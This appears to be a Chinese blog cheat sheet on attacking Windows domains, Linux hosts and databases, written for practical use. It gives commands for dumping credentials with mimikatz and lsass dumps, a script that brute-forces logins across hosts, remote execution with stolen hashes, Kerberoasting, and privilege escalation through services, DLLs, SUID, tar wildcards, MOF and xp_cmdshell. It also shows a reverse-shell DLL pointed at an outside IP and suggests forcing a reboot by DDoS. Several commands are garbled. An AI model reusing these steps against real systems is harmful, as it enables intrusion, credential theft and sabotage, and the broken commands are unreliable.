Domain Controllers：域控制器
Domain Guest：域访客，权限低
Domain users：域用户（大多数拿到权限，首先得到的是此身份）
Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权 ）
### 信息搜集
信息搜集主要是搜集当前所在的AD域以及环境。
**基本信息搜集**
旨在了解当前服务器的计算机基本信息与权限，为后续判断服务器角色，网络环境等做准备
systeminfo 详细信息
net start 启动信息
tasklist 进程列表
schtasks 计划任务

**网络信息搜集**
旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备

net time /domain 查看主域名。因为域下计算机时间都来自于AD域，所以这里就能打印得出。当然获取还有很多方式比如查看计算机属性等。

netstat -ano 查看本机开放的全部端口
nslookup 追溯域名（用这个命令追溯主域名） 追踪来源地址
****
**用户信息搜集**
旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试
whoami /all 用户权限
net config workstation 登录信息
net localgroup 本地用户组
net user /domain 当前域里面的用户
net group /doamin 获取域用户组信息
wmic useraccount get /all 涉及域用户详细信息
net group "Domain Admins/或写user" /domain 查询域管理员/ 用户账户
net group "Enterprise Admins" /domain 查询管理员用户组
net group "Domain Controllers" /domain 查询域控制器
****

**端口扫描**
不推荐nmap原因是nmap需要安装，nmap扫描可能会留下痕迹
```bash
# 系统自带内部命令，不易被察觉
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL =" 
```
****
**推荐工具**
nishang
采用powershell 脚本开发，系统语言所以一般不用做免杀。工具强大包含了mimikatz、扫描端口还有一系列信息搜集工具。类似于一个功能包
还可以做扫描ip端口工具![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/b2dba5f5163f0bfdc32385b85a3be76e.png)

### 获取明文密码 
选一种可行的方案,直到你获得密码。我本机装有火绒，我发现当我实验以下工具时，基本都会被杀掉。
**工具0：mimikatz**
这是一种很经典的获取内网密码的方式。
现在你可以直接打开mimikatz输入以下命令进行获取当前admin明文密码。

```bash
privilege::debug
# 获取明文密码、NTLM
sekurlsa::logonpasswords full
# 获取AES值
sekurlsa::ekeys
```
如果遇到上述情况失败等，你可以采用procdump+mimikatz获取密码。procdump在微软官方下载可以将密码转化为hash值

```bash
# 在敌方系统执行，将生成的lsass.dmp保存到自己电脑
 procdump -accepteula -ma lsass.exe lsass.dmp
# 在自己电脑上执行mimikatz上执行，以获得明文密码：
 sekurlsa::minidump lsass.dmp
```

**工具1: 从 Windows 凭据管理器和浏览器获取密码**
Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站和服务器的用户名、密码和证书。记不记得当你使用 Microsoft IE/EDGE 对网站进行身份验证后，通常会弹出一个弹出窗口，询问“是否要保存密码？”凭证存储就是存储这些信息的地方，在凭据管理器中，有两种类型的凭据：Web 和 Windows。你还记得哪个用户有权访问这些数据吗？它不是 system，而是登录后可以检索此信息的用户。这对我们来说是很好的，就像任何钓鱼网站或代码执行一样，我们通常都可以用别的方法获得那个用户的权限。最好的一点是，我们甚至不需要成为本地管理员来提取这些数据。
如何提取这些信息呢？我们可以使用两种不同的 PowerShell 脚本导入以收集此数据：

收集网络凭据：
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
收集 Windows 凭证（只收集通用的而不是目标域特有的）
https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1

**工具2： XenArmor**
 强大，根据你的电脑安全性而定，有人用他获得了所有密码，而我只用它获得了我的WIFI密码
破解链接，不知道安不安全，但是我装成功了https://www.sdbeta.com/wg/2020/0514/234852.html


#### windows 2012
管理的用户明文密码获取，利用工具获得明文密码前提是本身是高权限用户，如root，如AD域管理员。
当满足：

 - windows2012以下版本未安装KB2871997补丁
 - 
如果是windows2012以上版本默认是关闭wdigest。这时候你需要预先在注册表操作开启服务，即修改wdigest的值改为1

#### windows10
（以下参考于）
在 Windows 10之前，以本地管理员的身份在主机系统上运行 Mimikatz 的话是允许攻击者从 lsass（本地安全机构子系统服务）中提取明文密码的。这种方法在 Windows 10 出现之前非常有效，而在 windows 10 中，即使你是本地管理员，也无法直接读取它，使用此工具获取密码是空。
但是你可以通过如单点登录（ SSO ）或者一些特殊的软件会把密码保存在 LSASS 进程中让 Mimikatz 读取；
最简单的选项是设置注册表项以让系统将密码凭证保存到 LSASS 进程。在 HKLM 中，有一个 UseLogonCredential 设置，如果设置为0，系统将在内存中存储凭据
![在这里插入图片描述](https://img-blog.csdnimg.cn/3a6914a24a044057b33c35ae442fa2ce.png)
这个注册表修改的问题就是需要用户重新登录到系统。你可以让目标机器屏幕锁屏、重新启动或注销用户，以便你能够捕获然后再次发送凭证文本。最简单的方法是锁定他们的工作机器（这样他们就不会丢失他们的当前的工作…看看我有多好！）。要触发锁屏：

rundll32.exe user32.dll，LockWorkStation
一旦我们锁定屏幕，并让它们重新登录，我们就可以重新运行 Mimikatz 来获得明文密码。

![在这里插入图片描述](https://img-blog.csdnimg.cn/58fa73fde87c466dba0ac4439c4c178d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
####  Mac
有多个渗透攻击框架的 payload 支持 Mac，我最喜欢的是使用 Empire。Empire 可以生成多个 payload 来诱骗受害者执行我们的代理，其中包括 Ducky scripts、二进制可执行程序、Office 宏、Safari 启动程序、pkg 安装包等等。
### 横向渗透


####  传递爆破其他账户密码
这里主要是字典构建，即常用字典+自定义字典。
自定义字典来自于你首先获得的用户密码，然后将这个密码以及密码格式尝试爆破别的ip密码。
采用爆破，爆破有三个变量：密码（hash、明文）、ip、用户（信息搜集到的主机名）

```bash
import os,time
ips={
   '192.168.3.21',
   '192.168.3.25',
   '192.168.3.29',
}

users={
   'Administrator',
   'boss',
   'dbadmin',
}
passs={
   'admin',
   'admin!@#45',
   'Admin12345'
}

for ip in ips:
   for user in users:
       for mima in passs:
           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user
           print('--->'+exec+'<---')
           os.system(exec)
           time.sleep(1)
```

编写完脚本后打包成exe

#### 控制方法1：定时任务放后门
定时不仅可以用来提权还可以用来做连接。
这步是基于你完成上个小节获取明文密码后。经过端口扫描发现对方开放了139/445（共享文件端口、一般都是开放的）端口。因此你可以做以下操作进行存放特殊文件达到连接控制。
**at < Windows2012**
```bash
net use \192.168.3.21\ipc$ "密码" /user:god.org\ad
ministrator # 建立ipc连接：
copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器
at \192.168.3.21 15:47 c:\add.bat    #添加计划任务
```

**schtasks >=Windows2012**

```bash
net use \192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
ministrator # 建立ipc连接：
copy add.bat \192.168.3.32\c$ #复制文件到其C盘
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
```

或者在工具不被杀毒软件干掉情况下，你可以直接用别人写好的工具，更简洁还支持hash值连接。
atexec-impacket

```bash
atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
```


#### 控制方法2：建立连接
以下连接是建立在开放了SMB协议下。
为了省去你替工具做免杀的劳苦工作，当你获得主机的明文密码时，直接用微软官方自带工具psexec进行远程连接
```bash
psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
```

没有明文，那用第三方包smbexec
```bash
smbexec god/administrator:Admin12345@192.168.3.21
smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
```

### SPN
服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。

黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。
**探针**

```bash
# 类似于隐蔽的nmap扫描端口结果
setspn -q */*
setspn -q */* | findstr "MSSQL"
```

**请求**

```c
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"
mimikatz.exe "kerberos::ask /target:xxxx"
```

**导出**

```bash
mimikatz.exe "kerberos::list /export"
```

**破解**

```bash
python tgsrepcrack.py passwd.txt xxxx.kirbi
python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
```

**重写**

```bash
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512
mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
```

## linux渗透
### 信息搜集
网络信息:

netstat -anop | findstr LISTEN
net group “Domain Admins” /domain
流程列表:

tasklist /v
系统主机信息:

sysinfo
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
wmic qfe get Caption，Description，HotFixID，InstalledOn
简单的文件搜索:

dir /s password
findstr /s /n /i /p foo *
findstr /si pass .txt | .xml | *.ini
来自共享/挂载驱动器的信息:

powershell -Command “get-WmiObject -class Win32_Share”
powershell -Command “get-PSDrive”
powershell -Command “Get-WmiObject -Class Win32_MappedLogicalDisk | select Name， ProviderName”

# 杂项


## 获取数据库账号密码

### mysql

#### 获取基本信息

**版本**

#### 获取root账号密码

**获取明文密码**

1. 一般存在源码中配置文件或全局文件等
   2.存在mysql文件夹的user.mvd文件（.mvd格式存储的就是表的内容；）或者你直接读取mysql.user表 ;这时候的密码通常都是用md5加密的，需要用cmd5工具解密
   **暴力破解（了解数据库是否支持外联）**
   mysql的root不支持外联，所以你怎么爆破都爆破失败。浙石化你需要将脚本上传到对方服务器上执行爆破文件才有可能爆破成功。百度搜索：mysql爆破脚本；对方如果是python语言环境就上传python脚本，是php就上传php...

**sqlmap 注入的 --sql-shell 模式**

#### Oracle

一般网站是jsp。jsp有个特点是你获取到网站权限不需要提权直接就是system权限

### MssQL

最高权限sa,支持外联。外联可以用navicat或mssql数据库自带连接工具

### Redis
redis支持网络     可基于内存、可持久化的日志类型数据库.key-value数据库
端口号6379 
一般是linux系统

####  PostgreSQL

数据库高权限账号名是postgres

## 提权

后台权限（获得方式：爆破，SQL注入猜解，弱口令）：
	一般网站或者应用后台只能操作应用的界面内容数据，图片等叫做后台权限
	无法操作程序的源代码或者服务器上的资源文件。（如果后台存在功能文件操作的话，可以操作文件数据也可以--文件操作管理器--）
	
网站权限（后台，漏洞，第三方）：
	查看和修改（是否限制了管理员用户）程序源代码，可以进行网站或者应用的配置文件读取（接口配置信息，数据库配置信息），为后续收集服务器操作系统相关的的信息，为后续提权做准备。
	
数据库权限：
	只能操作数据库用户，数据库的增删改。源码或者配置文件泄露，也可能是网站权限进行的数据库配置文件读取获得。
	
接口权限：
	短信支付等接口，邮件接口，第三方登录接口。
	修改网站支付接口，改为自己。邮件，短信接口。
	后台权限，网站权限后的获取途径：后台（修改配置信息），网站权限（查看配置文件信息）
	
权限划分：补充webshell权限，webshell权限比普通用户低一点，比来宾用户大

本地权限：本地权限一般是内网渗透最初身份，通常是user，因此能用在webshell提权的都能用在本地提权上
****
提权一般都会进入tmp目录操作，即C:/tmp与/tmp 因为这个目录不需要高权限就可以写入
### 提权准备

提权可能是你利用SQL注入等获得高权限。当你需要打开web的cmd窗口执行更多操作时，你上传的是一个bat文件，文件内容是cmd.exe  



**了解当前系统情况**

```bash
whoami

# 看系统、版本号、修复信息
systeminfo
```


### window提权
系统提权是希望从adminstator升级到system权限
#### 提权准备
信息搜集工具选其一，顺手即可
**获取exp**
常见的公开漏洞要自己收集，具体怎么搜集后续我补充
```bash
systeminfo|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
```
或者你直接对输出的systeminfo利用kali 将提取任何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的 Kali 系统并运行 Windows Exploit Suggester 以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
回到你攻击的系统：

systeminfo
systeminfo > windows.txt
将 windows.txt 复制到你的 Kali 虚拟机的 /opt/Windows-Exploit-Suggester 下
python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls

![在这里插入图片描述](https://img-blog.csdnimg.cn/87574b84d19942bd99285b622de37069.png)

这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权限提升的漏洞。

**寻找exp：wes**
项目链接： https://github.com/bitsadmin/wesng
这个项目执行条件轻松，只需要对方的systeminfo就可以导出疑似的漏洞了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231022310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
最后生成的是一个资源列表，表明了可能存在的漏洞以及公开的exp。这时候你要注意筛选，看这些漏洞是否可用是否能达到提权效果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231655167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**寻找exp：windowsvulnscan**
项目链接： https://github.com/chroblert/WindowsVulnScan
主要应用在web层

**寻找exp**

优先选用MSF,但是MSF通常连带插件是半年更新一次，所以一般不会有新漏洞的EXP。这时候你就要善用搜索引擎了，已解释过如何搜索，不再重复



#### win2003

计划任务运行时会用系统权限执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131459291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131513127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### win7

win2003也可以执行

sc也可将admin提升为system
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131935411.png)

#### win2008

在微软官方下载pstools 。然后在cmd执行以下命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719132156791.png)

#### Windows2008&7令牌窃取提升-本地

当你获得系统的admin（但普通的webshell权限不行），令牌窃取就可以直接将权限提升到system。
进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。本地提权实验:获取会话-利用模块-窃取令牌-提权
Microsoft windows XP Professional SP3和之前版本

执行方法，利用msf获得反弹之后在msf中执行以下命令：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719165548297.png)


#### 不安全的服务权限配合MSF-本地权限

即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。

这大部分是本地提权因为webshell的权限达不到administrators，而普通的user权限通常系统是没有服务的。

##### 攻击过程
在微软官方下载accesschk.exe执行以下命令，如果你是user权限就将administrators换成users。如果提示无效账户名，那么就代表这种方法行不通，行得通窗口将出现打印的服务名。

accesschk.exe -uwqs “administrators”  *

行得通就执行

sc config.exe "服务名（皇上，根据前面打印的服务名，选个妃子吧）" binpath="修改的服务名的路径,通常是木马（如c:\test.exe）"

sc start "刚重置位置的服务名"

如下图是简约展示版本：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720133154875.png)


#### win2012不带引号服务路径配合MSF-Web,本地权限

原理：当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。
漏洞主要看第三方在配置系统时有没有按照规范来加引号，如果都规范了都加引号了，这方法就行不通。
比如输入命令c:/bei gai/ -c不加引号就可能编程目录为c:/bei后门gai/和-c是参数

##### 攻击过程
攻击原理是利用了windows启用服务都是system权限。
检测引号未加上的服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功

```bash
# 在cmd中输入以下命令以检测哪些服务未加上引号
# 但这个代码返回的路径可能是包含空格的，也可能是没有。筛选掉没有空格的
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
下图是我在cmd窗口执行的结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720104505573.png)
所以如果你要攻击我就很简单，下一步在D盘目录下创建一个名为Program的木马exe文件;
一旦管理员启动了服务，不会触发服务了，只会触发木马


#### win2012DLL劫持提权应用配合MSF-Web权限

原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：

1、应用程序加载的目录

2、C:\Windows\System32

3、C:\Windows\System

4、C:\Windows

5、当前工作目录Current Working Directory，CWD

6、在PATH环境变量的目录（先系统后用户）

过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功。这里替换dll通常会利用进程分析工具如火绒剑分析，dll替换应替换管理员会运行的系统文件，但这系统文件权限又没有特别高的，通常一些三方软件文件最合适。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720102304652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll >/opt/test.dll

#### Win2012烂土豆提权

所谓的烂土豆提权就是俗称的MS16-075
可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。
前提：需要对方服务器拥有net framework4.0

##### 提权原理

RottenPotato(烂土豆)提权的原理可以简述如下：
1.欺骗"NT AUTHORITY\SYSTEM"账户通过NTLM认证到我们控制的TCP终端
2.对这个认证过程使用中间人攻击（NTLM重放），为"NT AUTHORITY\SYSTEM"账户本地协商一个安全令牌。这个过程是通过一系列的windows API调
用实现的
3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务器账户（IIS,MSSQL）有这个权限，大多数用户级
的账户没有这个权限。
所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，发现使用已经创建好的账户（就是用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但是使用菜刀(iis服务器权限)反弹meterpreter就会成功
烂土豆比热土豆的优点是：
1.100%可靠
2.全版本通杀（当时）
3.立即生效，不会像hot potato那样有时候需要等windows更新才能使用
总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二部挑战应答过程中认证的区块改为自己的区块获取SYSTEM令牌，然后MSF模仿令牌。
更多看 https://blog.csdn.net/god_zzZ/article/details/106334702

##### 提权过程

低权限提权高权限

```bash
upload/root/potato.exe C: \Users \ Publiccd C: \ (Users \ \ Public
use incognito
list_tokens -u
execute -cH -f ./potato.exe
list_tokens -u
impersonate token "NT AUTHORITY\ \SYSTEM"
```
### LINUX提权
提权目的是要提权到最高权限root。

更多参见资料《linux提权手法总结》，下载链接 https://www.jason-w.cn/wp-content/uploads/2021/06/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-linux%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93.pdf



#### 提权准备
采用LinEnum进行信息搜集，使用方法很简单，直接将程序放在要检测的linux系统上即可。这个程序可以搜集linux服务器基本信息已经是否可以进行suid等。项目地址 https://github.com/rebootuser/LinEnum 

**漏洞探测**

linux-exploit-suggester 2 项目地址https://github.com/jondonas/linux-exploit-suggester-2
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720134227689.png)
#### SUID配置错误漏洞
SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。这就像windows某些应用你给它赋予了系统执行权限，这个应用又是好攻击的。
**探测**
```bash
FindSUID
find/ -perm -u=s -type f 2>/dev/null
FindGUID
find/ -perm -g=s -type f 2>/dev/null
```
如果执行发现返回的目录包含以下关键词的说明存在suid配置错误漏洞
nmap vim less more nano cp mv find

**执行**
不同的模块有不同的执行命令，这里以find为例。更多模块利用方式参见 https://pentestlab.blog/2017/09/25/suid-executables/
```bash
touch test 
# 反弹find的高权限到
find test exec netcat-lvp 5555-e /bin/sh \;
```


#### 压缩通配符
利用了压缩时会将checkpoint当做命令执行,定时任务有高权限
```bash
# 定时任务将要执行的文件
cd /home/undead/script
# 创建压缩文件
tar czf /tmp/backup.tar.gz *
# 将最终命令写入到
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh
echo  "" > "--checkpoint-action=exec=sh test.sh"
echo  "" > "--checkpoint=1
```

#### 定时任务执行权限分配过高
如图在定时任务中看到以下777权限的文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720191525289.png)
对高权限定时文件进行编辑写一些危险命令，如`chmod +s /tmp/bash`


### 数据库提权

在利用系统溢出漏洞无果的情况下，可以采用数据库提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除Access数据库外，其他数据库基本都是存在数据库提权的可能。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719134740292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
提权流程:服务探针-信息收集-提权利用-获取权限

#### Mysql

mysql安装之后是默认是集成系统最高权限，在获得root账号密码后，调用dll文件就可以获取系统权限了
更多mysql提权与利用参考https://www.sqlsec.com/2020/11/mysql.html

##### UDF

UDF (user defined function)，即用户自定义函数。


手工创建plugin目录或利用NTFS流创建

```bash
select 'x' into dumpfile '目录/lib/plugin : :INDEX_ALLOCATION';
1.mysql<5.1（版本通过执行命令select version()看出）导出目录c :/ windows或system32
2.mysql=>5.1导出  安装目录（通过@@basedir可以得出）/ lib/plugin/（默认没有/ lib/plugin/）
```

##### MOF

提权成功率低，因为要上传到敏感目录，一般有waf什么的都会导致上传失败。简单来说利用mysql高权限，将mysql文件进行替换
导出自定义mof文件到系统目录加载
https://www.cnblogs.com/xishaonian/p/6384535.html
select load_file ('c:/phpstudy/PHPTutorial/www/user_add.mof') into outfile 'c:/windows/system32/wbem/mof/nullevt.mof' ;

##### 启动项知识点:(基于配合操作系统自启动)

导出自定义可执行文件到启动目录配合重启执行
将创建好的后门或执行文件进行服务器启动项写入，配合重启执行!
具体做法如下：
执行下图语句开启数据库外联，只有开启才能用MSF进行利用
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719145450430.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719145643586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


win10默认自启动文件夹在 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719144928103.png)
这时候你只需要等待或主动让对方服务器重启，主动的话可以采用DDOS攻击等

##### 反弹知识点:(基于利用反弹特性命令执0行)

在web端执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719150329512.png)
在云服务器执行
nc -l -p 5577

#### Oracle提权演示

自动化工具：oracleshell,作者是冰蝎的作者
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719153918974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

普通用户模式:
前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。

DBA用户模式:(自动化工具演示)
拥有DBA账号密码,可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。

注入提升模式:(sqlmap测试演示)
拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显,需要自己验证。

（JSP网站不需要提权，自带system权限）

#### MssQL

以下方式提权有的命令是不会在数据库中进行回显值的。选其一执行

##### 使用xp_emdshell进行提权

xp_cmdshell默认在mssq12000中是开启的，在mssg12005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。
启用:
EXEC sp_configure 'show advanced options',1
RECONEIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
如图展示启动xp_cmdshell的过程
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719151756810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
开启之后就可以执行敏感操作了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719151920742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719152125480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### SQL sever 沙盒提权

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719153004358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### Redis

漏洞产生是因为自身配置导致的安全问题
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719155137106.png)

##### Redis数据库权限提升

redis服务因配置不当，可以被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Reids以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务连接（未授权或者有密码）
**利用如下方法提权**
利用计划任务执行命令反弹shell   nc监听。具体参考https://blog.csdn.net/fly_hps/article/details/80937837中（1）
		
**修复**
从修复可以看出其实这不属于漏洞只是一种配置不当导致的问题
【防外联】绑定需要访问数据库的ip。将127.0.0.1修改为需要访问此数据库的IP地址。
【防爆破】设置访问密码。在 Redis.conf中requirepass字段后，设置添加访问密码。
【即便连接上去权限也不高】修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。

####  PostgreSQL

PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处"特性”，管理员或具有"cOPY To/FROM PROGRAM"权限的用户，可以使用这个特性执行任意命令。提权利用的是
洞:CVE-2019-9193 CVE-2018-1058
连接-利用漏洞-执行-提权
提权参考: https://vulhub.org/#/environments/postgres/
修复方案:升级版本或打上补丁

# 代码审计

代码审计需要有一定的开发能力，对于拥有这里能力的人而言，这能够快速发现漏洞。
代码审计是指你获得源代码后对代码进行下载交互操作并做源代码层面的分析，因此你在做审计前通常需要提前配置好相关环境。
代码审计的内容可能是审计框架也可能是审计混写也可能是程序员全程自己写的

## phpweb

### 一键审计

seay系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞.文件下载链接https://github.com/f1tz/cnseay
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717220353916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 数据库监控

你可以用Seay系统自带的监控。但是通常不足够，有时候这个系统也抓不到，你可以再下一个mysql_moniter_client

### 常规代码审计

**搜索关键词**

利用seay搜索漏洞的相关关键词(程序关键词或注释)和接收用户交互的函数。
常见关键词

> **SQL注入**： select insert update mysql_query mysql、数据库等
>
> **文件上传**：$_FILES,type="file"，上传，move_upload_file()等
>
> **XSS跨站**： print print_r echo，sprintf die var_dump var_export等 
>
> **文件包含**： Include,include_once require， require_once等 
>
> **代码执行**： eval assert preg replace call user func call user，func array等 
>
> **命令执行**： system exec shell_exec `` passthru pcntl_exec popen， proc_open 
>
> **变量覆盖**： extract() parse_str() importrequestvariables() 、$$等
>
> **反序列化**： serialize() unserialize() _construct _destruct等 
